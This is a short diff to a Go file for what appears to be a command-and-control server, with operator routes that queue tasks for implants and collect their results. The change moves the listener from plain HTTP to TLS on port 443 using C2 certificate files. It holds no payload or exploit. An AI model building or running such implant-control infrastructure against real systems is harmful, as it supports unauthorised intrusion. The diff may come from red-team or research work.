@@ -1,10 +1,12 @@
 package main
 
 import (
-	"github.com/gin-gonic/gin"
-	"gorm.io/gorm"
+	"log"
 	"net/http"
 	"strconv"
+
+	"github.com/gin-gonic/gin"
+	"gorm.io/gorm"
 )
 
 type HTTPSListener struct {
@@ -28,8 +30,10 @@ func (l *HTTPSListener) listen() {
 	operator.POST("/tasks/:implant-id", l.AddTasks)
 	operator.GET("/results/:implant-id", l.ListResults)
 
-	// router.RunTLS(":443", "./tls.crt", "./tls.key") // TODO: cert + key paths should not be hardcoded
-	router.Run(":80")
+	err := router.RunTLS(":443", "cert/c2.crt", "cert/c2.key")
+	if err != nil {
+		log.Fatalf("Failed to start HTTPS server: %v", err)
+	}
 }
 
 func (l *HTTPSListener) Register(c *gin.Context) {
